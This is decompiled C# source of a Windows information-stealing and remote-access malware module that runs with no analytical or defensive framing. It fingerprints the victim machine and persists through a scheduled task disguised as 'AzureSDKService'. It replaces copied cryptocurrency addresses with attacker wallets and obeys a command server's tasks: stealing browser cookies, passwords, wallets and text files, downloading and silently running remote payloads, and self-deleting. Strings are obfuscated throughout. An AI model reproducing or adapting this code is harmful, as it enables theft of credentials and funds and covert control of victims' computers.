using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using MainModule.Classes;
using Omdagerssss;
using WMIGatherer.Gathering;
using WMIGatherer.Objects;

namespace Dodjins
{
	// Token: 0x02000009 RID: 9
	[Module(Author = "Dodjins", Description = "Dodjins deccr", Name = "Dodjins.", Version = "2.0")]
	public class Mrazilia
	{
		// Token: 0x06000019 RID: 25 RVA: 0x0000275C File Offset: 0x0000095C
		private static string NormalizeWithSplitAndJoin(string input)
		{
			string[] value = input.Split(new char[]
			{
				' '
			}, StringSplitOptions.RemoveEmptyEntries);
			return string.Join(" ", value);
		}

		// Token: 0x0600001A RID: 26 RVA: 0x0000278C File Offset: 0x0000098C
		static Mrazilia()
		{
			Mrazilia.SetupLibraries(Mrazilia.InstallDir + "\\" + Mrazilia.InstallName);
			AppDomain.CurrentDomain.AssemblyResolve += Mrazilia.ResourceResolve;
		}

		// Token: 0x0600001B RID: 27 RVA: 0x00002828 File Offset: 0x00000A28
		public Mrazilia()
		{
			Mrazilia.SetupLibraries(Mrazilia.InstallDir + "\\" + Mrazilia.InstallName);
			AppDomain.CurrentDomain.AssemblyResolve += Mrazilia.ResourceResolve;
		}

		// Token: 0x0600001C RID: 28 RVA: 0x0000287C File Offset: 0x00000A7C
		private static Assembly ResourceResolve(object sender, ResolveEventArgs args)
		{
			Assembly result;
			try
			{
				result = Assembly.LoadFrom(Mrazilia.InstallDir + "\\" + new AssemblyName(args.Name).Name + ".dll");
			}
			catch (Exception ex)
			{
				result = null;
			}
			return result;
		}

		// Token: 0x0600001D RID: 29 RVA: 0x000028D0 File Offset: 0x00000AD0
		private static void SetupLibraries(string AppPath)
		{
			try
			{
				bool flag = !File.Exists(Directory.GetParent(AppPath).FullName + "\\System.Data.SQLitomgha2ue.dll".Replace("omgha2u", string.Empty));
				if (flag)
				{
					File.WriteAllBytes(Directory.GetParent(AppPath).FullName + "\\System.Daomgha2uta.SQLite.dll".Replace("omgha2u", string.Empty), Resources.System_Data_SQLite);
				}
				bool flag2 = !Directory.Exists(Directory.GetParent(AppPath).FullName + "\\x836".Replace("3", string.Empty));
				if (flag2)
				{
					Directory.CreateDirectory(Directory.GetParent(AppPath).FullName + "\\x863".Replace("3", string.Empty));
				}
				bool flag3 = !Directory.Exists(Directory.GetParent(AppPath).FullName + "\\x624".Replace("2", string.Empty));
				if (flag3)
				{
					Directory.CreateDirectory(Directory.GetParent(AppPath).FullName + "\\x64q".Replace("q", string.Empty));
				}
				bool flag4 = !File.Exists(Directory.GetParent(AppPath).FullName + "\\\\x86\\SQLite.Interfffffop.dll".Replace("fffff", string.Empty));
				if (flag4)
				{
					File.WriteAllBytes(Directory.GetParent(AppPath).FullName + "\\\\x86\\SQLite.Interfqffffop.dll".Replace("fqffff", string.Empty), Resources.SQLite_Interop_x86);
				}
				bool flag5 = !File.Exists(Directory.GetParent(AppPath).FullName + "\\\\x64\\SQLite.Interop.dqqwll".Replace("qqw", string.Empty));
				if (flag5)
				{
					File.WriteAllBytes(Directory.GetParent(AppPath).FullName + "\\\\x64\\SQLite.Interofqffffp.dll".Replace("fqffff", string.Empty), Resources.SQLite_Interop_x64);
				}
			}
			catch (Exception ex)
			{
				Console.WriteLine(ex.ToString());
			}
		}

		// Token: 0x17000001 RID: 1
		// (get) Token: 0x0600001E RID: 30 RVA: 0x00002AEC File Offset: 0x00000CEC
		// (set) Token: 0x0600001F RID: 31 RVA: 0x00002AF4 File Offset: 0x00000CF4
		private Connection Connection { get; set; }

		// Token: 0x06000020 RID: 32 RVA: 0x00002B00 File Offset: 0x00000D00
		[InputParam(Names = new string[]
		{
			"ID",
			"ApplicationPath",
			"ServerAdress",
			"InstallPath",
			"Wallets"
		})]
		[STAThread]
		public void Execute(string ID, string AppPath, string ServiceAdress, string InstallPath, Dictionary<string, j7u7h7h6h6rg> Wallets)
		{
			try
			{
				this.ComputerInfo = Mrazilia.c0k2dk(ID);
				this.RunSheuldue(Mrazilia.InstallDir + "\\" + Mrazilia.InstallName);
				this.loooooooooe81l(Wallets);
				this.Connection = new Connection(this.ComputerInfo, ServiceAdress, AppPath);
				this.Connection.BeginListener();
				this.Connection.firstLayer.Subscribe(this.ComputerInfo).Wait();
				this.TaskDiescitp();
				for (;;)
				{
					Thread.Sleep(1000);
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000021 RID: 33 RVA: 0x00002BA8 File Offset: 0x00000DA8
		public static SubInfo c0k2dk(string buildID)
		{
			NetInfo netInfo = new WebClient().DownloadString("https://ipinfo.io/json").ParseJSON<NetInfo>();
			string text = Mrazilia.SPSOAJName();
			text = Mrazilia.NormalizeWithSplitAndJoin(string.Join<char>(string.Empty, from x in text.Trim()
			where !"йцукенгшщзхъфывапролджэяQQQQQQQQQQчсмитьбюЙЦУКЕНГШЩЗХЪФЫВАПРОWWWWWWЛДЖЭЯЧСМИТЬБЮ".Replace("QQQQQQQQQQ", string.Empty).Replace("WWWWWW", string.Empty).Contains(x)
			select x).Trim());
			SubInfo subInfo = new SubInfo();
			subInfo.Country = netInfo.country;
			subInfo.IpAdress = netInfo.ip;
			subInfo.Processor = Mrazilia.Procesl12();
			subInfo.OS = text;
			subInfo.VideoCard = Mrazilia.Vide();
			subInfo.HWID = HWID.Generate();
			subInfo.BuildID = buildID;
			subInfo.SystemSecurities = (from x in SecurityGatherer.GetSecurityProducts(0)
			select x.Name).ToList<string>();
			return subInfo;
		}

		// Token: 0x06000022 RID: 34 RVA: 0x00002CA0 File Offset: 0x00000EA0
		public void loooooooooe81l(Dictionary<string, j7u7h7h6h6rg> Wallets)
		{
			clripwmai2.OnClipboardChangeEventHandler <>9__1;
			Task.Factory.StartNew(delegate
			{
				try
				{
					clripwmai2.OnClipboardChangeEventHandler value;
					if ((value = <>9__1) == null)
					{
						value = (<>9__1 = delegate(fornau2 obj, object args)
						{
							try
							{
								bool flag = obj == fornau2.Text;
								if (flag)
								{
									bool flag2 = !string.IsNullOrWhiteSpace(args.ToString());
									if (flag2)
									{
										string text = args.ToString().Trim();
										foreach (KeyValuePair<string, j7u7h7h6h6rg> keyValuePair in Wallets)
										{
											bool flag3 = Regex.IsMatch(text, keyValuePair.Value.Pattern) && text != keyValuePair.Value.Wallet;
											if (flag3)
											{
												Clipboard.SetText(keyValuePair.Value.Wallet);
											}
										}
									}
								}
							}
							catch
							{
							}
						});
					}
					clripwmai2.OnClipboardChange += value;
					clripwmai2.Start();
					for (;;)
					{
						Thread.Sleep(500000);
					}
				}
				catch (Exception ex)
				{
				}
			});
		}

		// Token: 0x06000023 RID: 35 RVA: 0x00002CD4 File Offset: 0x00000ED4
		public void SafeRunner(Action action)
		{
			try
			{
				action();
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000024 RID: 36 RVA: 0x00002D04 File Offset: 0x00000F04
		public void TaskDiescitp()
		{
			Task.Factory.StartNew(delegate
			{
				for (;;)
				{
					this.SafeRunner(delegate
					{
						List<AvaliableTask> result = this.Connection.firstLayer.GetTasks(this.ComputerInfo).Result;
						using (List<AvaliableTask>.Enumerator enumerator = result.GetEnumerator())
						{
							while (enumerator.MoveNext())
							{
								AvaliableTask task = enumerator.Current;
								Action <>9__3;
								Action <>9__4;
								Action <>9__5;
								Action <>9__6;
								Action <>9__7;
								Action <>9__8;
								Action <>9__9;
								Action <>9__10;
								this.SafeRunner(delegate
								{
									bool flag = task.Action.Contains("StealALL");
									if (flag)
									{
										Mrazilia <>4__this = this;
										Action action;
										if ((action = <>9__3) == null)
										{
											action = (<>9__3 = delegate
											{
												AllInfo info = new AllInfo();
												this.SafeRunner(delegate
												{
													info.Cookies = Dominatroer.cccokies().Result;
												});
												this.SafeRunner(delegate
												{
													info.Log = Dominatroer.StealPassword().Result;
												});
												this.SafeRunner(delegate
												{
													info.TextFiles = (from x in Dominatroer.ttexxxt
													select new TextFile
													{
														Name = x.Name,
														Bytes = File.ReadAllBytes(x.FullName)
													}).ToList<TextFile>();
												});
												this.SafeRunner(delegate
												{
													info.Wallets = Dominatroer.sssq2();
												});
												this.Connection.firstLayer.SendAllData(this.ComputerInfo, info).Wait();
												this.Connection.firstLayer.CompleteTask(this.ComputerInfo, task.ID).Wait();
											});
										}
										<>4__this.SafeRunner(action);
									}
									bool flag2 = task.Action.Contains("StealWallets");
									if (flag2)
									{
										Mrazilia <>4__this2 = this;
										Action action2;
										if ((action2 = <>9__4) == null)
										{
											action2 = (<>9__4 = delegate
											{
												this.Connection.firstLayer.SendWallets(this.ComputerInfo, Dominatroer.sssq2()).Wait();
												this.Connection.firstLayer.CompleteTask(this.ComputerInfo, task.ID).Wait();
											});
										}
										<>4__this2.SafeRunner(action2);
									}
									bool flag3 = task.Action.Contains("StealCookies");
									if (flag3)
									{
										Mrazilia <>4__this3 = this;
										Action action3;
										if ((action3 = <>9__5) == null)
										{
											action3 = (<>9__5 = delegate
											{
												this.Connection.firstLayer.SendCookies(this.ComputerInfo, Dominatroer.cccokies().Result).Wait();
												this.Connection.firstLayer.CompleteTask(this.ComputerInfo, task.ID).Wait();
											});
										}
										<>4__this3.SafeRunner(action3);
									}
									bool flag4 = task.Action.Contains("StealPasswords");
									if (flag4)
									{
										Mrazilia <>4__this4 = this;
										Action action4;
										if ((action4 = <>9__6) == null)
										{
											action4 = (<>9__6 = delegate
											{
												this.Connection.firstLayer.SendPasswords(this.ComputerInfo, Dominatroer.StealPassword().Result).Wait();
												this.Connection.firstLayer.CompleteTask(this.ComputerInfo, task.ID).Wait();
											});
										}
										<>4__this4.SafeRunner(action4);
									}
									bool flag5 = task.Action.Contains("Execute");
									if (flag5)
									{
										Mrazilia <>4__this5 = this;
										Action action5;
										if ((action5 = <>9__7) == null)
										{
											action5 = (<>9__7 = delegate
											{
												bool flag9 = !Directory.Exists(Mrazilia.InstallDir + "\\WorkDir");
												if (flag9)
												{
													Directory.CreateDirectory(Mrazilia.InstallDir + "\\WorkDir");
												}
												new WebClient().DownloadFile(task.Target, Mrazilia.InstallDir + "\\WorkDir\\" + task.Target.Split(new char[]
												{
													'/'
												}).Last<string>());
												bool executeSilient = task.ExecuteSilient;
												if (executeSilient)
												{
													Process.Start(new ProcessStartInfo
													{
														FileName = Mrazilia.InstallDir + "\\WorkDir\\" + task.Target.Split(new char[]
														{
															'/'
														}).Last<string>(),
														CreateNoWindow = true,
														WindowStyle = ProcessWindowStyle.Hidden,
														WorkingDirectory = Mrazilia.InstallDir + "\\WorkDir"
													});
												}
												else
												{
													Process.Start(new ProcessStartInfo
													{
														FileName = Mrazilia.InstallDir + "\\WorkDir\\" + task.Target.Split(new char[]
														{
															'/'
														}).Last<string>(),
														WorkingDirectory = Mrazilia.InstallDir + "\\WorkDir"
													});
												}
												this.Connection.firstLayer.CompleteTask(this.ComputerInfo, task.ID).Wait();
											});
										}
										<>4__this5.SafeRunner(action5);
									}
									bool flag6 = task.Action.Contains("Delete");
									if (flag6)
									{
										Mrazilia <>4__this6 = this;
										Action action6;
										if ((action6 = <>9__8) == null)
										{
											action6 = (<>9__8 = delegate
											{
												this.Connection.firstLayer.CompleteTask(this.ComputerInfo, task.ID).Wait();
												Mrazilia.RemoveByPath(Mrazilia.InstallDir + "\\" + Mrazilia.InstallName);
												Mrazilia.KillOAIA(Mrazilia.InstallDir + "\\" + Mrazilia.InstallName);
											});
										}
										<>4__this6.SafeRunner(action6);
									}
									bool flag7 = task.Action.Contains("StealText");
									if (flag7)
									{
										Mrazilia <>4__this7 = this;
										Action action7;
										if ((action7 = <>9__9) == null)
										{
											action7 = (<>9__9 = delegate
											{
												this.Connection.firstLayer.SendTxt(this.ComputerInfo, (from x in Dominatroer.ttexxxt
												select new TextFile
												{
													Name = x.Name,
													Bytes = File.ReadAllBytes(x.FullName)
												}).ToList<TextFile>()).Wait();
												this.Connection.firstLayer.CompleteTask(this.ComputerInfo, task.ID).Wait();
											});
										}
										<>4__this7.SafeRunner(action7);
									}
									bool flag8 = task.Action.Contains("ClearCookie");
									if (flag8)
									{
										Mrazilia <>4__this8 = this;
										Action action8;
										if ((action8 = <>9__10) == null)
										{
											action8 = (<>9__10 = delegate
											{
												this.Connection.ClearCookie();
												this.Connection.firstLayer.CompleteTask(this.ComputerInfo, task.ID).Wait();
											});
										}
										<>4__this8.SafeRunner(action8);
									}
								});
							}
						}
					});
					Thread.Sleep(300000);
				}
			});
		}

		// Token: 0x06000025 RID: 37 RVA: 0x00002D20 File Offset: 0x00000F20
		public void RunSheuldue(string AppPath)
		{
			Task.Factory.StartNew(delegate
			{
				for (;;)
				{
					try
					{
						Process.Start(new ProcessStartInfo
						{
							Arguments = string.Concat(new string[]
							{
								"/C schtasks /create /tn AzureSDKService /tr \"",
								AppPath,
								"\" /st ",
								DateTime.Now.AddMinutes(1.0).ToString("HH:mm"),
								" /du 9999:59 /sc daily /ri 1 /f"
							}),
							WindowStyle = ProcessWindowStyle.Hidden,
							CreateNoWindow = true,
							FileName = "cmd.exe",
							RedirectStandardOutput = true,
							UseShellExecute = false
						});
					}
					catch
					{
					}
					Thread.Sleep(50000);
				}
			});
		}

		// Token: 0x06000026 RID: 38 RVA: 0x00002D54 File Offset: 0x00000F54
		public static void RemoveByPath(string Path)
		{
			Process.Start(new ProcessStartInfo
			{
				Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + Path + "\"",
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = "cmd.exe"
			});
		}

		// Token: 0x17000002 RID: 2
		// (get) Token: 0x06000027 RID: 39 RVA: 0x00002DA0 File Offset: 0x00000FA0
		// (set) Token: 0x06000028 RID: 40 RVA: 0x00002DA7 File Offset: 0x00000FA7
		private static string InstallDir { get; set; } = Path.GetTempPath() + "Moflkud2noCeflkud2cil".Replace("flkud2", "");

		// Token: 0x17000003 RID: 3
		// (get) Token: 0x06000029 RID: 41 RVA: 0x00002DAF File Offset: 0x00000FAF
		// (set) Token: 0x0600002A RID: 42 RVA: 0x00002DB6 File Offset: 0x00000FB6
		private static string InstallName { get; set; } = "Fazathsd111sron.exsd111se".Replace("sd111s", "");

		// Token: 0x0600002B RID: 43 RVA: 0x00002DC0 File Offset: 0x00000FC0
		public static void KillOAIA(string AppPath)
		{
			FileInfo fileInfo = new FileInfo(AppPath);
			foreach (Process process in Process.GetProcessesByName(fileInfo.Name.Split(new char[]
			{
				'.'
			})[0]))
			{
				try
				{
					process.Kill();
					process.WaitForExit();
				}
				catch
				{
				}
			}
		}

		// Token: 0x0600002C RID: 44 RVA: 0x00002E30 File Offset: 0x00001030
		private void SSub(string AppPath)
		{
			FileInfo fileInfo = new FileInfo(AppPath);
			Process[] processesByName = Process.GetProcessesByName(fileInfo.Name.Split(new char[]
			{
				'.'
			})[0]);
			for (int i = 0; i < processesByName.Count<Process>(); i++)
			{
				bool flag = processesByName[i].MainModule.FileName != Mrazilia.InstallDir + "\\" + Mrazilia.InstallName || i != 0;
				if (flag)
				{
					try
					{
						processesByName[i].Kill();
						processesByName[i].WaitForExit();
					}
					catch
					{
					}
				}
			}
		}

		// Token: 0x0600002D RID: 45 RVA: 0x00002EDC File Offset: 0x000010DC
		private static string Vide()
		{
			string result = string.Empty;
			ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT Capq23123tion FROM Win32_Viq23123deoController".Replace("q23123", ""));
			using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectSearcher.Get().GetEnumerator())
			{
				if (enumerator.MoveNext())
				{
					ManagementObject managementObject = (ManagementObject)enumerator.Current;
					result = managementObject["Captiqwwwwwon".Replace("qwwwww", "")].ToString();
				}
			}
			return result;
		}

		// Token: 0x0600002E RID: 46 RVA: 0x00002F74 File Offset: 0x00001174
		private static string Procesl12()
		{
			ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT *frf333 FROM Win32_Pfrf333rocessor".Replace("frf333", ""));
			string result = null;
			foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
			{
				ManagementObject managementObject = (ManagementObject)managementBaseObject;
				bool flag = managementObject["name"] != null;
				if (flag)
				{
					result = managementObject["name"].ToString();
				}
			}
			return result;
		}

		// Token: 0x0600002F RID: 47
		[DllImport("kernel32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		private static extern bool IsWow64Process([In] IntPtr hProcess, out bool wow64Process);

		// Token: 0x06000030 RID: 48 RVA: 0x00003010 File Offset: 0x00001210
		private static bool InternalCheckIsWow64()
		{
			bool flag = (Environment.OSVersion.Version.Major == 5 && Environment.OSVersion.Version.Minor >= 1) || Environment.OSVersion.Version.Major >= 6;
			if (flag)
			{
				using (Process currentProcess = Process.GetCurrentProcess())
				{
					bool result;
					bool flag2 = !Mrazilia.IsWow64Process(currentProcess.Handle, out result);
					if (flag2)
					{
						return false;
					}
					return result;
				}
			}
			return false;
		}

		// Token: 0x06000031 RID: 49 RVA: 0x000030A8 File Offset: 0x000012A8
		private static string SPSOAJName()
		{
			string str = string.Empty;
			ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT Captiffffqwwwwon FROM Win32_OffffqwwwwperatingSystem".Replace("ffffqwwww", ""));
			using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectSearcher.Get().GetEnumerator())
			{
				if (enumerator.MoveNext())
				{
					ManagementObject managementObject = (ManagementObject)enumerator.Current;
					str = managementObject["Captyyyyyyion".Replace("yyyyyy", "")].ToString();
				}
			}
			return str + " x" + (Mrazilia.is64BitOperatingSystem ? "64bit" : "32bit");
		}

		// Token: 0x04000017 RID: 23
		private SubInfo ComputerInfo = new SubInfo();

		// Token: 0x0400001B RID: 27
		private static bool is64BitProcess = IntPtr.Size == 8;

		// Token: 0x0400001C RID: 28
		private static bool is64BitOperatingSystem = Mrazilia.is64BitProcess || Mrazilia.InternalCheckIsWow64();
	}
}
